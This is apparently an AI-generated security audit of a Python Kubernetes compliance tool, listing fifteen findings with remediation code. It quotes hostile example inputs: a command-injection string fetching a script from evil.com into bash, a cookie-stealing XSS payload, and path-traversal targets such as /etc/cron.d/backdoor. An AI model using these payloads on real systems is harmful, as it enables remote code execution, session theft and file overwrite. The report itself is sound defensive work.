# KlusterShield Security Vulnerability Report

**Project:** KlusterShield v0.1.0  
**Language:** Python 3.11+  
**Scan Date:** 2026-02-21  
**Auditor:** Claude Code Static Analysis  
**Scope:** Full source — `klustershield/`, `scripts/`, `manifests/`, `requirements.txt`, `pyproject.toml`

---

## Severity Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 2 |
| 🟠 HIGH | 5 |
| 🟡 MEDIUM | 4 |
| 🔵 LOW | 4 |
| **Total** | **15** |

---

## Findings

---

### 🔴 CRITICAL-1 — Command Injection via Unsanitized Shell String Interpolation

**File:** `scripts/provision_cluster.py`, lines 104–136  
**CWE:** [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)  
**NIST 800-218:** PS.1.1, PS.2.1  

#### Description

User-controlled values (`k3s_version`, `token`, `control_plane_ip`) are interpolated directly into a shell command string using f-strings and then executed on remote nodes via `subprocess.run(["ssh", ..., command])`. The `token` itself is fetched from a remote host and then re-injected into a subsequent shell command — a classic second-order injection.

```python
# provision_cluster.py:104
install_cmd = (
    f"curl -sfL https://get.k3s.io | "
    f"INSTALL_K3S_VERSION='{k3s_version}' "   # ← attacker-controlled CLI arg
    f"K3S_TOKEN='{token}' "                    # ← value read from remote node
    f"sh -"
)
run_remote(ip, ssh_user, ssh_key, install_cmd)
```

If `k3s_version` contains `'; curl https://evil.com/shell.sh | bash; echo '` or `token` contains shell metacharacters, arbitrary commands execute on every worker node.

#### Remediation

1. **Validate `k3s_version`** against a strict semver allowlist before use:
   ```python
   import re
   K3S_VERSION_RE = re.compile(r'^v\d+\.\d+\.\d+\+k3s\d+$')
   if not K3S_VERSION_RE.match(k3s_version):
       raise ValueError(f"Invalid k3s version: {k3s_version}")
   ```
2. **Validate `token`** to alphanumeric + hyphens only:
   ```python
   TOKEN_RE = re.compile(r'^[A-Za-z0-9:_\-]{10,512}$')
   if not TOKEN_RE.match(token):
       raise ValueError("Suspicious token value — aborting")
   ```
3. **Replace `subprocess.run` + SSH CLI** with `paramiko` and pass commands as argument lists, never shell strings. Paramiko's `exec_command` does not invoke a shell, eliminating injection.
4. **Never interpolate remote-fetched values** back into subsequent shell commands without re-validation.

---

### 🔴 CRITICAL-2 — SSH MITM via `StrictHostKeyChecking=no`

**File:** `scripts/provision_cluster.py`, line 90  
**CWE:** [CWE-297 — Improper Validation of Certificate with Host Mismatch](https://cwe.mitre.org/data/definitions/297.html)  
**NIST 800-218:** PO.3.2, DS.1.1  

#### Description

All SSH sessions disable host key verification:

```python
["ssh", "-i", ssh_key, "-o", "StrictHostKeyChecking=no", f"{ssh_user}@{ip}", command]
```

This allows a MITM attacker to intercept the SSH session and capture the k3s join token, Proxmox credentials, and kubeconfig — all transmitted during provisioning. Particularly dangerous in cloud/Proxmox environments where ARP spoofing is trivial on the same VLAN.

#### Remediation

1. **Pre-populate `~/.ssh/known_hosts`** with the expected host keys before provisioning (via Proxmox API console fingerprint retrieval).
2. **Use `StrictHostKeyChecking=accept-new`** only on the very first connection to a brand-new VM (combined with IP allowlisting).
3. **Prefer `paramiko`** with explicit `load_host_keys()` and `reject_policy` for host key validation:
   ```python
   import paramiko
   client = paramiko.SSHClient()
   client.load_host_keys('/path/to/known_hosts')
   client.set_missing_host_key_policy(paramiko.RejectPolicy())
   client.connect(ip, username=ssh_user, key_filename=ssh_key)
   ```
4. **Never use `StrictHostKeyChecking=no`** in production provisioning scripts.

---

### 🟠 HIGH-3 — Cross-Site Scripting (XSS) in HTML Compliance Reports

**File:** `klustershield/scanner/engine.py`, lines 221–295  
**CWE:** [CWE-79 — Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)  
**NIST 800-218:** PW.7.2  

#### Description

HTML reports are built via raw f-string concatenation with Kubernetes API data injected unescaped into the output:

```python
rows += f"""
    <tr>
        <td>{c.control_id}</td>
        <td>{c.finding}</td>       # ← raw Kubernetes data: pod names, ns names, labels
        <td>{c.remediation}</td>   # ← raw string
    </tr>"""
```

A pod named `<script>document.location='https://evil.com/?c='+document.cookie</script>` will execute JavaScript in the browser of any user who opens the report. This is a stored XSS via Kubernetes object metadata.

#### Remediation

1. **Use Python's `html.escape()`** on all dynamic values before HTML interpolation:
   ```python
   import html
   rows += f"""
       <tr>
           <td>{html.escape(c.control_id)}</td>
           <td>{html.escape(c.finding)}</td>
           <td>{html.escape(c.remediation)}</td>
       </tr>"""
   ```
2. **Switch to Jinja2** (already in `requirements.txt`) with `autoescape=True` — this was the intended approach and automatically escapes all variables:
   ```python
   from jinja2 import Environment, FileSystemLoader
   env = Environment(loader=FileSystemLoader('templates'), autoescape=True)
   template = env.get_template('report.html.j2')
   html_out = template.render(checks=result.checks, score=result.score)
   ```
3. **Add a Content-Security-Policy** meta tag to generated reports:
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'">
   ```

---

### 🟠 HIGH-4 — Path Traversal in `--output` Flag

**File:** `klustershield/scanner/engine.py` (report method), `klustershield/cli.py` line 69  
**CWE:** [CWE-22 — Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)  
**NIST 800-218:** PW.4.1  

#### Description

The `--output` path is used directly without validation:

```python
# No sanitization before write
Path(output_path).write_text(html_content)
```

An attacker (or misconfigured CI pipeline) passing `--output /etc/cron.d/backdoor`, `--output ~/.bashrc`, or `--output ../../etc/passwd` could overwrite sensitive files when the tool runs with elevated permissions.

#### Remediation

1. **Resolve and validate the output path** against an allowed base directory:
   ```python
   from pathlib import Path
   output = Path(output_path).resolve()
   safe_base = Path.cwd().resolve()
   if not str(output).startswith(str(safe_base)):
       raise click.BadParameter(f"Output path must be within current directory: {output}")
   ```
2. **Validate the file extension** to `.html` or `.json` only:
   ```python
   if output.suffix not in {'.html', '.json'}:
       raise click.BadParameter("Output must be .html or .json")
   ```
3. **Warn if the output file already exists** to avoid accidental overwrites.

---

### 🟠 HIGH-5 — Proxmox Password Exposed via CLI Argument

**File:** `scripts/provision_cluster.py`, line 155  
**CWE:** [CWE-214 — Invocation of Process Using Visible Sensitive Information](https://cwe.mitre.org/data/definitions/214.html)  
**NIST 800-218:** DS.2.1  

#### Description

```python
@click.option("--proxmox-password", envvar="PROXMOX_PASSWORD", help="Proxmox password")
```

CLI arguments are visible in `ps aux`, shell history (`~/.bash_history`, `~/.zsh_history`), system audit logs, and CI/CD job logs. Any user on the system with access to `/proc` can read another process's arguments.

#### Remediation

1. **Remove `--proxmox-password` as a CLI flag entirely.** Require env var only:
   ```python
   proxmox_password = os.environ.get("PROXMOX_PASSWORD")
   if not proxmox_password:
       raise click.UsageError("PROXMOX_PASSWORD environment variable is required")
   ```
2. **Alternatively, use `click.password_option()`** which prompts interactively without echoing:
   ```python
   @click.password_option("--proxmox-password", envvar="PROXMOX_PASSWORD")
   ```
3. **Consider Proxmox API token auth** (user + token ID + secret) instead of password auth. Tokens have finer-grained permissions and can be rotated without changing account passwords.
4. **Add `PROXMOX_PASSWORD` to `.gitignore`** (already done via `.env` pattern) and document that it must never be set via `--proxmox-password` in CI scripts.

---

### 🟠 HIGH-6 — `initContainers` and `ephemeralContainers` Not Scanned

**File:** `klustershield/scanner/engine.py` — multiple check methods  
**CWE:** [CWE-1254 — Incorrect Comparison Logic Granularity](https://cwe.mitre.org/data/definitions/1254.html)  
**NIST 800-218:** PS.1.1, PS.2.1, PW.4.1, PW.7.2, DS.2.1  

#### Description

Five compliance checks iterate only `p.spec.containers`, ignoring `initContainers` and `ephemeralContainers`:

| Check | Control | Gap |
|-------|---------|-----|
| `_check_no_privileged_containers` | PS.1.1 | initContainers/ephemeralContainers not checked |
| `_check_no_root_containers` | PS.2.1 | initContainers not checked |
| `_check_resource_limits` | PW.4.1 | initContainers not checked |
| `_check_readonly_root_fs` | PW.7.2 | initContainers not checked |
| `_check_secrets_not_in_env` | DS.2.1 | initContainers not checked |

This creates a compliance gap where workloads pass all scans by placing privileged or root logic in `initContainers`. Ironically, the Gatekeeper Rego policy **does** check `initContainers` — creating an inconsistency between admission control and the compliance report.

#### Remediation

For each affected check, expand the container iteration to include all container types:

```python
def _all_containers(pod):
    """Return all containers including init and ephemeral."""
    containers = list(pod.spec.containers or [])
    containers += list(pod.spec.init_containers or [])
    containers += list(pod.spec.ephemeral_containers or [])
    return containers
```

Apply this helper consistently across all five affected checks.

---

### 🟠 HIGH-7 — PSA `enforce-version: latest` — Unpinned Policy Semantics

**File:** `klustershield/provisioner/namespace.py`, line 143  
**CWE:** [CWE-1357 — Reliance on Insufficiently Trustworthy Component](https://cwe.mitre.org/data/definitions/1357.html)  
**NIST 800-218:** PO.1.1  

#### Description

```python
"pod-security.kubernetes.io/enforce-version": "latest",
```

`latest` means the PodSecurity policy semantics will change automatically when Kubernetes is upgraded. A cluster upgrade can silently break compliant workloads or (worse) silently loosen restrictions if the policy definition changes between Kubernetes releases. This violates the principle of explicit, reproducible compliance baselines.

#### Remediation

1. **Pin to a specific Kubernetes version:**
   ```python
   "pod-security.kubernetes.io/enforce-version": "v1.28",
   ```
2. **Make the version a configurable parameter** tied to the cluster's actual Kubernetes version:
   ```python
   # Detect from server version or accept as provisioner option
   "pod-security.kubernetes.io/enforce-version": f"v{k8s_major}.{k8s_minor}",
   ```
3. **Document the upgrade process**: when upgrading Kubernetes, bump the PSA version in a controlled change with regression testing.

---

### 🟡 MEDIUM-8 — Operator Precedence Bug in `_check_resource_limits`

**File:** `klustershield/scanner/engine.py`, lines 422–428  
**CWE:** [CWE-480 — Use of Incorrect Operator](https://cwe.mitre.org/data/definitions/480.html)  
**NIST 800-218:** PW.4.1  

#### Description

Python's `and`/`or` operator precedence causes incorrect logic in the kube-system exclusion filter:

```python
# Current (buggy):
if not c.resources or not c.resources.limits
and not p.metadata.namespace.startswith("kube-")

# Python evaluates as:
if (not c.resources) or (not c.resources.limits and not namespace.startswith("kube-"))
```

**Effect:** Containers without any `resources` object in `kube-*` namespaces are falsely flagged (should be excluded). Containers with `resources` set but no `limits` in non-kube-* namespaces are correctly flagged, but the compound condition is unreliable and will silently produce wrong results with any future edits.

#### Remediation

Add explicit parentheses to enforce the intended precedence:

```python
missing = [
    f"{p.metadata.namespace}/{p.metadata.name}"
    for p in pods
    for c in (p.spec.containers or [])
    if (not c.resources or not c.resources.limits)       # ← parentheses required
    and not p.metadata.namespace.startswith("kube-")
]
```

Add a unit test specifically for this condition to prevent regression.

---

### 🟡 MEDIUM-9 — Exception Handler Silently Inflates Compliance Score

**File:** `klustershield/scanner/engine.py`, lines 138–148  
**CWE:** [CWE-390 — Detection of Error Condition Without Action](https://cwe.mitre.org/data/definitions/390.html)  
**NIST 800-218:** RV.1.3, PV.1.1  

#### Description

All exceptions in compliance checks are caught and converted to `SKIP`:

```python
except Exception as e:
    check_result = ControlCheck(
        control_id="ERR",
        status=Status.SKIP,    # ← SKIP does not penalize score
        finding=str(e),
    )
```

A `403 Forbidden` from the Kubernetes API (indicating the tool lacks RBAC to audit a resource) silently becomes a `SKIP` with no score impact. This means a misconfigured or under-privileged deployment produces an **artificially high compliance score** by skipping checks it cannot perform.

#### Remediation

1. **Differentiate exception types:**
   ```python
   from kubernetes.client.exceptions import ApiException
   except ApiException as e:
       if e.status == 403:
           status = Status.FAIL   # RBAC error = genuine finding
           finding = f"Insufficient permissions to audit {control_id}: {e.reason}"
       elif e.status == 404:
           status = Status.SKIP   # Resource doesn't exist = skip is OK
           finding = f"Resource not found for {control_id}"
       else:
           status = Status.SKIP
           finding = str(e)
   except Exception as e:
       status = Status.SKIP
       finding = f"Unexpected error: {e}"
   ```
2. **Log all exceptions** to stderr regardless of status so operators are aware of check failures.
3. **Add a check-level `error_count` to the final report** so that a report with many `SKIP`s due to errors is clearly flagged.

---

### 🟡 MEDIUM-10 — Dead Code: `pod_selector == {}` Never True

**File:** `klustershield/scanner/engine.py`, lines 540–543  
**CWE:** [CWE-561 — Dead Code](https://cwe.mitre.org/data/definitions/561.html)  
**NIST 800-218:** DS.1.1  

#### Description

```python
deny_all = [
    p for p in policies
    if p.spec.pod_selector == {}   # ← DEAD: V1LabelSelector object ≠ dict {}
    or (
        p.spec.pod_selector and
        not p.spec.pod_selector.match_labels and
        not p.spec.pod_selector.match_expressions
    )
]
```

`p.spec.pod_selector` is a `kubernetes.client.models.V1LabelSelector` object. It will never equal the Python dict `{}`. The first branch is permanently `False`. This is dead code that misleads maintainers and could mask future bugs if the first branch is ever expected to trigger.

#### Remediation

Remove the dead branch and rely solely on the correct object-attribute check:

```python
deny_all = [
    p for p in policies
    if (
        p.spec.pod_selector is not None
        and not p.spec.pod_selector.match_labels
        and not p.spec.pod_selector.match_expressions
    )
]
```

Add a comment explaining why this correctly identifies an "all pods" selector.

---

### 🟡 MEDIUM-11 — No Input Validation on `--namespace` and `--team` Arguments

**File:** `klustershield/cli.py`, lines 42, 50  
**CWE:** [CWE-20 — Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)  
**NIST 800-218:** PW.4.1  

#### Description

Namespace names and team labels are passed to the Kubernetes API without validation. Kubernetes namespace names must conform to RFC 1123 DNS labels (lowercase alphanumeric and hyphens, max 63 chars). The `team` value is also used to construct an RBAC group name (`system:klustershield:{team}`) — values with slashes, colons, or spaces cause undefined RBAC behavior.

#### Remediation

Add `click` parameter callbacks for validation:

```python
import re

NS_RE = re.compile(r'^[a-z0-9][a-z0-9\-]{0,61}[a-z0-9]$')
TEAM_RE = re.compile(r'^[a-z0-9][a-z0-9\-]{0,61}[a-z0-9]$')

def validate_namespace(ctx, param, value):
    if not NS_RE.match(value):
        raise click.BadParameter(
            "Must be a valid DNS label: lowercase alphanumeric and hyphens, max 63 chars"
        )
    return value

@main.command()
@click.option("--namespace", "-n", required=True, callback=validate_namespace)
```

---

### 🔵 LOW-12 — Deprecated `datetime.utcnow()`

**File:** `klustershield/provisioner/namespace.py`, line 132  
**CWE:** [CWE-477 — Use of Obsolete Function](https://cwe.mitre.org/data/definitions/477.html)  

#### Description

`datetime.datetime.utcnow()` is deprecated in Python 3.12 and will be removed in a future version.

#### Remediation

```python
# Before:
datetime.datetime.utcnow().strftime("%Y%m%d")

# After:
datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d")
```

---

### 🔵 LOW-13 — Jinja2 Listed as Dependency But Not Used

**File:** `requirements.txt`, line 11; `klustershield/scanner/engine.py`  

#### Description

`jinja2>=3.1.2` is declared as a dependency but the HTML report generation uses raw f-string concatenation instead. Jinja2's `autoescape=True` would have prevented the XSS vulnerability described in HIGH-3. This represents both dead dependency weight and a missed security opportunity.

#### Remediation

1. **Implement Jinja2 templating** with `autoescape=True` for report generation (see HIGH-3 remediation).
2. If Jinja2 remains unused, **remove it from `requirements.txt`** to reduce the dependency surface.

---

### 🔵 LOW-14 — Dev Dependencies Mixed into Production `requirements.txt`

**File:** `requirements.txt`, lines 22–35  

#### Description

`pytest`, `black`, `ruff`, and `mypy` are listed in the main `requirements.txt`. This forces dev tooling into production environments and CI deployments unnecessarily.

#### Remediation

Move dev dependencies to `pyproject.toml` optional extras:

```toml
[project.optional-dependencies]
dev = [
    "pytest>=7.4.0",
    "pytest-asyncio>=0.23.0",
    "pytest-mock>=3.12.0",
    "black>=23.12.0",
    "ruff>=0.1.9",
    "mypy>=1.8.0",
]
```

Then install with `pip install -e ".[dev]"` for development, `pip install -e .` for production.

---

### 🔵 LOW-15 — Missing Modules: `enforcer` and `auditor` Packages Absent

**File:** `klustershield/cli.py`, lines 107, 148  

#### Description

The `enforce` and `audit` CLI commands import from modules that do not exist:

```python
from klustershield.enforcer.gatekeeper import GatekeeperManager  # ← missing
from klustershield.auditor.shipper import AuditShipper             # ← missing
```

Both commands raise `ModuleNotFoundError` at runtime. The project cannot be considered buildable/functional without these stubs.

#### Remediation

Either:
1. **Implement the modules** (`klustershield/enforcer/gatekeeper.py`, `klustershield/auditor/shipper.py`) with at minimum stub classes.
2. **Add guard clauses** with user-friendly error messages until the modules are implemented:
   ```python
   def enforce(...):
       try:
           from klustershield.enforcer.gatekeeper import GatekeeperManager
       except ImportError:
           raise click.ClickException(
               "The 'enforce' command is not yet implemented in this release. "
               "See https://github.com/rudy101/KlusterShield/issues for status."
           )
   ```
3. **Mark the commands as hidden** in the CLI until the modules exist:
   ```python
   @main.command(hidden=True)
   ```

---

## Dependency CVE Surface (Informational)

Run the following to check for known CVEs in pinned dependencies once installed:

```bash
pip install pip-audit
pip-audit -r requirements.txt
```

Key packages to monitor:

| Package | Notes |
|---------|-------|
| `kubernetes>=28.1.0` | Official client; keep pinned to match cluster API version |
| `weasyprint>=60.0` | PDF generation with HTML parsing — high-value attack surface if fed untrusted HTML |
| `pyyaml>=6.0.1` | 6.x uses safe loader by default; verify no `yaml.load()` without `Loader=` |
| `jinja2>=3.1.2` | Keep updated; prior versions had SSTI vulnerabilities |
| `splunk-sdk>=1.7.4` | Monitor for auth-related CVEs |

---

## Quick-Win Remediation Priority

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| 1 | CRITICAL-1: Command injection | Medium | Prevents RCE on cluster nodes |
| 2 | CRITICAL-2: SSH MITM | Low | Prevents credential theft during provisioning |
| 3 | HIGH-3: XSS in reports | Low | Add `html.escape()` — 1 line per field |
| 4 | HIGH-6: initContainers gap | Low | Add `_all_containers()` helper — closes compliance gap |
| 5 | HIGH-5: Password in CLI args | Low | Remove flag, require env var only |
| 6 | MEDIUM-8: Precedence bug | Low | Add parentheses — fixes scoring accuracy |
| 7 | MEDIUM-9: Silent exceptions | Medium | Fix score inflation from permission errors |
| 8 | HIGH-4: Path traversal | Low | Add `Path.resolve()` guard |
| 9 | HIGH-7: PSA version pinning | Low | Replace `latest` with `v1.28` |
| 10 | LOW-15: Missing modules | Low | Add stubs or helpful error messages |

---

## Build Instructions

```bash
# Create and activate virtual environment
python -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Install KlusterShield in editable mode
pip install -e .

# Verify CLI is available
klustershield --version

# Run linting (once ruff is installed)
ruff check klustershield/
mypy klustershield/

# Check for dependency CVEs
pip install pip-audit
pip-audit -r requirements.txt
```

> **Note:** The `enforce` and `audit` subcommands will raise `ModuleNotFoundError` until the missing `klustershield/enforcer/` and `klustershield/auditor/` packages are implemented (see LOW-15).

---

*Report generated by Claude Code static analysis — 2026-02-21*
